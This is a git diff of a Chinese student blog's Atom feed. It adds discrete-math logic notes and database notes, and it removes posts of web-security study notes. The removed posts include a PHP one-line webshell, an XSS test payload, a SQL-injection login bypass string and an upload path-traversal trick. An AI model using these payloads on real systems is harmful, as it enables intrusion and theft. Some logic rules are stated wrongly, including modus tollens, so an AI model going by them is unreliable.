@@ -2,13 +2,215 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://wangyingying625.github.io</id>
     <title>mldwyy</title>
-    <updated>2021-03-08T05:54:55.470Z</updated>
+    <updated>2021-03-08T11:22:50.845Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://wangyingying625.github.io"/>
     <link rel="self" href="https://wangyingying625.github.io/atom.xml"/>
     <logo>https://wangyingying625.github.io/images/avatar.png</logo>
     <icon>https://wangyingying625.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, mldwyy</rights>
+    <entry>
+        <title type="html"><![CDATA[离散数学问题]]></title>
+        <id>https://wangyingying625.github.io/post/chi-san-shu-xue-wen-ti/</id>
+        <link href="https://wangyingying625.github.io/post/chi-san-shu-xue-wen-ti/">
+        </link>
+        <updated>2021-03-08T08:23:45.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="如何给集合下定义">如何给集合下定义</h2>
+<h2 id="如何用集合定义关系函数和自然数">如何用集合定义关系,函数和自然数</h2>
+<h2 id="如何比较集合的大小">如何比较集合的大小</h2>
+<h2 id="有没有最大的集合">有没有最大的集合</h2>
+<h2 id="能否把每个集合的元素依次列举">能否把每个集合的元素依次列举</h2>
+<h2 id="什么是图">什么是图</h2>
+<h2 id="有哪些图">有哪些图</h2>
+<h2 id="图有什么性质">图有什么性质</h2>
+<h2 id="什么是欧拉图">什么是欧拉图</h2>
+<h2 id="什么是哈密顿图">什么是哈密顿图</h2>
+<h2 id="什么是树">什么是树</h2>
+<h2 id="如何用矩阵表示图">如何用矩阵表示图</h2>
+<h2 id="什么是平面图">什么是平面图</h2>
+<h2 id="什么是图的着色">什么是图的着色</h2>
+<h2 id="什么是带权图">什么是带权图</h2>
+<h2 id="什么是支配集">什么是支配集</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[图论]]></title>
+        <id>https://wangyingying625.github.io/post/tu-lun/</id>
+        <link href="https://wangyingying625.github.io/post/tu-lun/">
+        </link>
+        <updated>2021-03-08T08:22:15.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="图">图</h1>
+<h2 id="基本概念">基本概念</h2>
+<h2 id="连通性">连通性</h2>
+<h2 id="欧拉图与哈密顿图">欧拉图与哈密顿图</h2>
+<h2 id="树">树</h2>
+<h2 id="图的矩阵表示">图的矩阵表示</h2>
+<h2 id="平面图">平面图</h2>
+<h2 id="着色">着色</h2>
+<h2 id="带权图">带权图</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[集合论]]></title>
+        <id>https://wangyingying625.github.io/post/ji-he-lun/</id>
+        <link href="https://wangyingying625.github.io/post/ji-he-lun/">
+        </link>
+        <updated>2021-03-08T08:18:30.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="集合">集合</h1>
+<h2 id="基本概念">基本概念</h2>
+<h3 id="命题公式">命题公式:</h3>
+<h4 id="联结词">联结词:</h4>
+<p>p,q,r...表示原子命题(简单命题,可当做逻辑变量即布尔变量);0表示假,1表示真</p>
+<ol>
+<li>否定联结词 ¬ :<br>
+¬p称为p的否定式 :<br>
+<img src="https://wangyingying625.github.io/post-images/1615192683283.png" alt="" loading="lazy"></li>
+<li>合取联结词∧:<br>
+p ∧q称为p与q的合取式<br>
+<img src="https://wangyingying625.github.io/post-images/1615192963199.png" alt="" loading="lazy"></li>
+<li>析取联结词∨:<br>
+p∨q称为q与p的析取式<br>
+<img src="https://wangyingying625.github.io/post-images/1615193105570.png" alt="" loading="lazy"></li>
+<li>蕴涵联结词-&gt;:<br>
+p-&gt;q的真假性与p&lt;=q一致<br>
+<img src="https://wangyingying625.github.io/post-images/1615193176146.png" alt="" loading="lazy"></li>
+<li>等价联结词&lt;-&gt;:<br>
+p&lt;-&gt;q与p==q真假性一致<br>
+<img src="https://wangyingying625.github.io/post-images/1615193661156.png" alt="" loading="lazy"><br>
+优先级: ¬ ,∨ ∧,-&gt; &lt;-&gt;</li>
+</ol>
+<h3 id="命题公式-2">命题公式:</h3>
+<h4 id="命题公式的组成">命题公式的组成:</h4>
+<ol>
+<li>单个命题变元就是命题公式</li>
+<li>对命题变元进行有限次联结词连接得到的也是命题公式</li>
+</ol>
+<h4 id="命题公式的类型">命题公式的类型:</h4>
+<ol>
+<li>可满足式:当一个命题公式,其中的原子命题取不同的值时可能对应公式取值为真.</li>
+<li>矛盾式(永假式):原子命题所有可能的取值组合(0,1组合)下,此公式的取值都为假</li>
+<li>重言式(永真式):原子命题所有可能的取值组合(0,1组合)下,此公式的取值都为真(是可满足式的一种)</li>
+</ol>
+<h3 id="等值式">等值式:</h3>
+<p>定义:两个命题公式满足A&lt;=&gt;B则A&lt;-&gt;B是永真式.即A与B可以互相代替</p>
+<p>正确性的证明:两边列真值表,若在原子命题取不同值的时候两边的取值都一样,则验证正确</p>
+<h4 id="常用等值式">常用等值式:</h4>
+<ol>
+<li>蕴涵等值式:p-&gt;q  &lt;=&gt;   ¬ p∨q  (蕴涵联结词是多余的,可被与或非表示)</li>
+<li>幂等律：A∧A⇔A      ||||||||||        A∨A⇔A</li>
+<li>交换律：A∨B⇔B∨A    ||||||||||||     A∧B⇔B∧A</li>
+<li>结合律：<br>
+（A∧B）∧C⇔A∧（B∧C）<br>
+（A∨B）∨C⇔A∨（B∨C）</li>
+<li>分配律：<br>
+A∨（B∧C）⇔（A∨B）∧（A∨C）<br>
+A∧（B∨C）⇔（A∧B）∨（A∧C）</li>
+<li>德摩根律：<br>
+┐（A∨B）⇔┐A∧┐B<br>
+┐（A∧B）⇔┐A∨┐B</li>
+<li>吸收律：<br>
+A∨（A∧B）⇔A<br>
+A∧（A∨B）⇔A</li>
+<li>零律：<br>
+A∨1⇔1<br>
+A∧0⇔0</li>
+<li>同一律：<br>
+A∨0⇔A<br>
+A∧1⇔A</li>
+<li>排中律：A∨┐A⇔1(若A不对则非A一定对)</li>
+<li>矛盾律：A∧┐A⇔0(若A对则非A一定不对)</li>
+<li>双重否定律：┐┐A⇔A</li>
+<li>等价等值式:A&lt;-&gt;B &lt;=&gt; (A -&gt; B)∧(B-&gt;A) (等价联结词是多余的,可被蕴含联结词和与或非表示)</li>
+<li>等价否定等值式：A↔B⇔┐A↔┐B</li>
+<li>归谬论：（A→B）∧（A→┐B）⇔┐A<br>
+只涉及与或非时,与跟或换时0跟1也换</li>
+</ol>
+<h4 id="等值演算就是给一个命题公式通过等值式的转换得到另外一个命题公式他们俩是等价的可用真值表验证">等值演算:就是给一个命题公式通过等值式的转换得到另外一个命题公式,他们俩是等价的(可用真值表验证)</h4>
+<p>判断两个公式是否相等的两种方法:等值演算;列真值表<br>
+任何两个公式只要是相等的一定能通过等值演算证明</p>
+<h3 id="推理">推理:</h3>
+<p>由一个命题得出另外一个命题的过程</p>
+<h4 id="推理的形式结构">推理的形式结构:</h4>
+<p>前提:A1,A2,A3...<br>
+结论:B<br>
+形式结构:<br>
+(A1 ∧ A2 ∧ A3 ∧ A4...)-&gt;B</p>
+<h4 id="推理定律">推理定律</h4>
+<p>A=&gt;B则A-&gt;B是永真式</p>
+<ol>
+<li>拒取式:(A-&gt;B)∧ ¬ B  =&gt;  A</li>
+<li>附加律:A=&gt;(A∨B)</li>
+<li>化简律:(A∧B)=&gt;A,(A∧B)=&gt;B</li>
+<li>假言:(A-&gt;B)∧A=&gt;B(A能推出B,并且A是对的,那么B就是对的)</li>
+<li>析取三段论:(A∨B)∧ ¬ A=&gt;B<br>
+(AVB)∧ ¬ B=&gt;A<br>
+A和B必有嫌疑人,排除A那B是嫌疑人</li>
+<li>假言三段论:(A-&gt;B)∧(B-&gt;C) =&gt;(A-&gt;C)</li>
+<li>等价三段论:(A&lt;-&gt;B)∧(B&lt;-&gt;C) =&gt;(A&lt;-&gt;C)</li>
+<li>构造性两难:(A-&gt;B)∧(C-&gt;D)∧(AVC) =&gt; (BVD)</li>
+</ol>
+<h4 id="判断推理正确的方法">判断推理正确的方法</h4>
+<p>前提:p-&gt;(q-&gt;r),p,q<br>
+结论:r<br>
+方法一:</p>
+<ol>
+<li>写出推理的形式结构</li>
+<li>证明该形式结构永真<br>
+<img src="https://wangyingying625.github.io/post-images/1615198910960.jpg" alt="" loading="lazy"><br>
+方法二:从前提推演结论<br>
+(P-&gt;(q-&gt;r))∧p∧q  =&gt;<br>
+(q-&gt;r)∧q  =&gt;<br>
+r</li>
+</ol>
+<h3 id="谓词逻辑">谓词逻辑:</h3>
+<p>对命题再进行细分.命题是陈述句,再按照主语谓语分<br>
+主语是个体,谓语是谓词</p>
+<h4 id="基本概念-2">基本概念</h4>
+<ol>
+<li>个体:可以独立存在的客体,通常用a,b,c表示个体常元;用x,y,z表示个体变元</li>
+<li>谓词:表示个体性质或者彼此之间联系的词,常用F,G,H..表示<br>
+F(x)表示x具有性质F<br>
+若F(x,y)表示x&gt;y则F(3,2)表示3大于2</li>
+<li>量词:表示数量的词:<br>
+全称量词:所有的⩝<br>
+⩝x表示所有的x<br>
+⩝xF(x)表示个体域里的所有x都有F(x)这个属性<br>
+存在量词:存在∃<br>
+∃xF(x)表示个体域中有x 有性质F</li>
+</ol>
+<h4 id="命题符号化">命题符号化:</h4>
+<p><img src="https://wangyingying625.github.io/post-images/1615200644492.jpg" alt="" loading="lazy"><br>
+<img src="https://wangyingying625.github.io/post-images/1615200651176.jpg" alt="" loading="lazy"></p>
+<h4 id="一阶谓词逻辑公式">一阶谓词逻辑公式</h4>
+<p>量词加在个体上,即任何X或者存在X<br>
+<img src="https://wangyingying625.github.io/post-images/1615201094641.jpg" alt="" loading="lazy"><br>
+如果逻辑公式A在任何解释下都为真,则它是永真式<br>
+如果逻辑公式A在任何解释下都为真,则它是永假式<br>
+如果逻辑公式A至少存在一个解释使其为真,则它是可满足式<br>
+如果A&lt;-&gt;B是永真的,那么A与B等值,记为A&lt;=&gt;B</p>
+<h5 id="基本等值式">基本等值式:</h5>
+<ol>
+<li>在有限个体域上消去量词:<br>
+⩝xA(x)&lt;=&gt;A(x1)∧A(x2)∧A(x3)∧A(x4)∧A(x5)∧A(x6)...<br>
+∃yB(y)&lt;=&gt;B(y1)∨B(y2)∨B(y3)∨B(y4)∨B(y5)∨B(y6)∨B(y7)...</li>
+<li>量词否定等值式:<br>
+¬ ⩝xA(x) &lt;=&gt; ∃x ¬ A(x)<br>
+¬ ∃xB(x) &lt;=&gt; ⩝x ¬ B(x)</li>
+<li>量词辖域收缩和扩张等值式:<br>
+<img src="https://wangyingying625.github.io/post-images/1615201852622.png" alt="" loading="lazy"><br>
+<img src="https://wangyingying625.github.io/post-images/1615202547661.png" alt="" loading="lazy"></li>
+</ol>
+<hr>
+<h2 id="运算和性质">运算和性质</h2>
+<h1 id="二元关系">二元关系</h1>
+<h2 id="表示和性质">表示和性质</h2>
+<h2 id="等价关系">等价关系</h2>
+<h2 id="序关系">序关系</h2>
+<h1 id="函数">函数</h1>
+<h1 id="自然数">自然数</h1>
+<h1 id="基数和序数">基数和序数</h1>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[数据库思维导图]]></title>
         <id>https://wangyingying625.github.io/post/shu-ju-ku-si-wei-dao-tu/</id>
@@ -82,6 +284,12 @@
 事务具有一致性:数据库的一个状态经过一个事务运行到另外一个状态<br>
 事务具有隔离性:并发执行的多个事务间互不干扰<br>
 事务具有持久性:一个事务若成功执行,那它对数据库的影响就是永久的</p>
+<p>引入事务的作用有:</p>
+<ol>
+<li>数据库异常时的恢复(根据数据库的更新策略不同采取的具体措施也不同,commit列表和active列表)</li>
+<li>提供事务回滚,能让数据库从一个状态运行到另一个状态</li>
+<li>多应用程序并发访问数据库时为这些程序提供隔离方法(加锁,两段锁协议能避免多用户并发访问数据库时发生冲突即事务可串行调度,加锁又可能让系统死锁,死锁的预防策略是一次封锁,等待死亡)</li>
+</ol>
 <h3 id="什么是死锁什么是活锁">什么是死锁,什么是活锁</h3>
 <p>死锁:A申请B占有的排他锁;B也申请A占有的排他锁,导致两个事务都无法推进下去的情况<br>
 活锁:A申请B占有的排他锁,B释放锁后给了C...A长期得不到锁</p>
@@ -144,6 +352,23 @@
 <ol>
 <li>用断言定义: ASSERT ageRe on user:age&gt;0</li>
 <li>定义表时用check子句:CREATE TABLE user(id INT,name VARCHAR(10),age INT)CHECK (age&gt;0)</li>
+</ol>
+<h3 id="常用的聚集函数">常用的聚集函数:</h3>
+<ol>
+<li>AVG</li>
+<li>MIN</li>
+<li>MAX</li>
+<li>COUNT</li>
+<li>SUM</li>
+</ol>
+<h3 id="group-by使用时的要求">GROUP BY使用时的要求:</h3>
+<p>在select指定的字段要么要包含在Group By语句的后面，作为分组的依据；要么就要被包含在聚合函数中</p>
+<h3 id="数据库设计中的各范式及其要求">数据库设计中的各范式及其要求:</h3>
+<ol>
+<li>1NF:强调列的原子性,即要求不能大表套小表</li>
+<li>2NF:1NF+必须有主键+非主键的属性必须完全依赖于主键不能部分依赖</li>
+<li>3NF:2NF+非主键必须直接依赖于主键不能传递依赖</li>
+<li>BCNF:3NF+若属性A能决定属性B要求属性A必须是主键</li>
 </ol>
 ]]></content>
     </entry>
@@ -697,171 +922,5 @@ CAST(NULL AS Varchar(20))同上</p>
 <li>需要预编译,得到纯C代码</li>
 </ol>
 ]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Git 使用代理]]></title>
-        <id>https://wangyingying625.github.io/post/git-shi-yong-dai-li/</id>
-        <link href="https://wangyingying625.github.io/post/git-shi-yong-dai-li/">
-        </link>
-        <updated>2021-03-04T05:19:28.000Z</updated>
-        <content type="html"><![CDATA[<p>GRidea 的更新总是失败，需要手动给git增加一个全局代理。</p>
-<p>设置代理<br>
-git config --global https.proxy http://127.0.0.1:1087</p>
-<p>git config --global https.proxy https://127.0.0.1:1087<br>
-取消代理<br>
-git config --global --unset http.proxy</p>
-<p>git config --global --unset https.proxy</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[OWASP TOP 10 漏洞笔记]]></title>
-        <id>https://wangyingying625.github.io/post/owasp-top-10-lou-dong-bi-ji/</id>
-        <link href="https://wangyingying625.github.io/post/owasp-top-10-lou-dong-bi-ji/">
-        </link>
-        <updated>2021-03-04T05:18:41.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="注入">注入</h1>
-<h2 id="sql-注入">SQL 注入</h2>
-<ol>
-<li>产生条件:网站执行的sql代码需要结合用户输入<br>
-用户输入恶意的sql代码<br>
-使用order by 1检测出正常被执行的代码查询结果列数<br>
-使用union拼接恶意查询语句(union查询结果列数需要与前面执行的sql语句查询列数相同)</li>
-<li>测试方法:<br>
-2.1 数字型:SELECT * from user WHERE id= 1 and 1=2;即可以用and永假式看是否异常测试;<br>
-2.2 字符型:SELECT * from user WHERE name='name1' and '1'='1'</li>
-<li>可能危害:执行SQL代码,获取数据库信息</li>
-<li>注意点:union并时要求返回元组有相同的属性数目,需要提前用order by 1/2/3...测试前面语句的返回属性数</li>
-</ol>
-<p>mysql 可以写文件, 但是要求,绝对路径 --&gt; 写入文件</p>
-<h2 id="命令注入">命令注入</h2>
-<p>提交的命令注入到原始的命令中</p>
-<ol>
-<li>基础知识:管道符|能把前面命令的输出当做后面命令的输入<br>
-; 分号后的命令能被直接执行<br>
-&amp;&amp;符号如果前面命令执行成功就接着执行后面命令<br>
-|| 如果前面命令执行失败就执行后面命令<br>
-php的exec函数会把参数当做命令执行</li>
-<li>可能危害:get shell</li>
-</ol>
-<h2 id="失效的身份认证">失效的身份认证</h2>
-<ol>
-<li>
-<p>弱口令&amp;口令破解<br>
-使用burpsuit抓包:<br>
-send to intruder-&gt;options选择爆破点-&gt;payloads-&gt;payload Type -&gt;start attack</p>
-</li>
-<li>
-<p>cookie伪造&amp;cookie绕过<br>
-Admin=1</p>
-</li>
-</ol>
-<h2 id="xml-外部实体xxe-xml-external-entity">XML 外部实体(XXE--XML External Entity)</h2>
-<h3 id="基础知识">基础知识:</h3>
-<ol>
-<li>xml可扩展标记语言,用来传输和存储数据,标记电子文件使其具有结构性</li>
-<li>xml包括xml声明+DTD(文档类型定义)+文档元素<br>
-其中DTD内容可以用户自己声明也可以引用外部链接地址</li>
-</ol>
-<h3 id="xxe">XXE</h3>
-<p>攻击原理:在文档类型定义处引用外部链接时,恶意用户可以引入一个可执行文件</p>
-<p>Doc , Excel , 配置文件</p>
-<h1 id="失效的访问控制">失效的访问控制</h1>
-<h2 id="越权访问逻辑漏洞">越权访问(逻辑漏洞)</h2>
-<ol>
-<li>
-<p>水平越权<br>
-userA 修改/查看和他同一级别的用户userB隐秘属性</p>
-</li>
-<li>
-<p>垂直越权<br>
-userA 获取到比他高级的用户admin权限</p>
-</li>
-</ol>
-<h1 id="安全配置错误">安全配置错误</h1>
-<h2 id="不安全的默认配置">不安全的默认配置</h2>
-<p>开启debug模式,如PHP框架(larvael)开启了debuger会显示出所有变量内容(包括数据库密码)<br>
-开了php报错,会显示错误信息: 网站绝对路径</p>
-<h1 id="跨站脚本xss">跨站脚本(XSS)</h1>
-<ol>
-<li>产生条件:网站对用户输入提交的信息未进行处理<br>
-恶意用户在表单部分输入恶意js代码</li>
-<li>测试方法:<br>
-在表单部分输入代码<br>
-<code>&lt;details open ontoggle=prompt('hello')&gt;</code></li>
-<li>可能危害:<br>
-获取用户cookie<br>
-破坏网页结构</li>
-</ol>
-<h1 id="不安全的反序列化对象注入">不安全的反序列化(对象注入)</h1>
-<p>序列化 : 变量 (对象) --&gt; 字符串<br>
-反序列化 :字符串 --&gt; 变量 (对象)</p>
-<h2 id="php中的魔术方法">php中的魔术方法:</h2>
-<ol>
-<li></li>
-</ol>
-<p>127.0.0.1/a.php<br>
-User<br>
-user: name :yy id: 3 lasttime: 2021.xxx<br>
-序列化成字符串<br>
-127.0.0.1/b.php<br>
-字符串反序列化成对象</p>
-<p>php : __wake()</p>
-<h1 id="使用含有已知漏洞的组件">使用含有已知漏洞的组件</h1>
-<p>struct2<br>
-fastjson<br>
-weblogic<br>
-shiro</p>
-<p>中国: cnvd<br>
-国际: cve</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[src漏洞总结]]></title>
-        <id>https://wangyingying625.github.io/post/src-lou-dong-zong-jie/</id>
-        <link href="https://wangyingying625.github.io/post/src-lou-dong-zong-jie/">
-        </link>
-        <updated>2021-03-04T05:17:41.000Z</updated>
-        <content type="html"><![CDATA[<p>漏洞1:<br>
-1.可能危害:获取用户cookie,修改HTML代码<br>
-2.复现过程:登录-&gt;留言板留言写入HTML标签及js代码<br>
-3.复现结果:留言板处写入的代码被存进数据库,插入到原来的HTML内,破坏原来页面结构;当其他用户查看这个页面时候执行恶意插入的js代码获取用户cookie</p>
-<p>反序列化漏洞:<br>
-绕过认证:<br>
-漏洞1(修改get参数绕过验证):<br>
-1.危害:修改用户密码,登录并用该身份查看信息<br>
-2.复现过程:登录时选择忘记密码-&gt;试用户名-&gt;选择找回密码-&gt;选择手机验证码验证-&gt;修改get部分参数绕过手机验证-&gt;密码修改成功<br>
-3.复现结果:用户密码修改成功</p>
-<p>漏洞2(修改参数userId绕过认证):<br>
-1.危害:登录用户账号获取用户用户名和密码信息<br>
-2.复现过程:登录已知用户-&gt;修改用户ID-&gt;返回用户信息(包括用户密码)</p>
-<p>文件上传:<br>
-一句话木马:</p>
-<?php
-eval($_POST['cmd']);
-? 绕过 :
-
-<?php 
-if ((
-    ($_FILES["file"]["type"] == "image/gif")
-        || ($_FILES["file"]["type"] == "image/jpeg")
-        || ($_FILES["file"]["type"] == "image/jpg")
-        || ($_FILES["file"]["type"] == "image/pjpeg")
-        || ($_FILES["file"]["type"] == "image/x-png")
-        || ($_FILES["file"]["type"] == "image/png"))
-path : /var/www/html
-uid : server/upload/
-
-/var/www/html/server/upload/ 不可解析 !
-uid : server/upload/../a.php = server/a.php
-waf:
-
-任意文件下载(包含):
-下载任意文件
-执行代码
-漏洞1:
-注入:
-漏洞1(SQL注入):
-1.危害:无密码登录
-2.复现过程:登录时用户名部分填入admin' or '1'='1 密码任意->无密码登录成功]]></content>
     </entry>
 </feed>
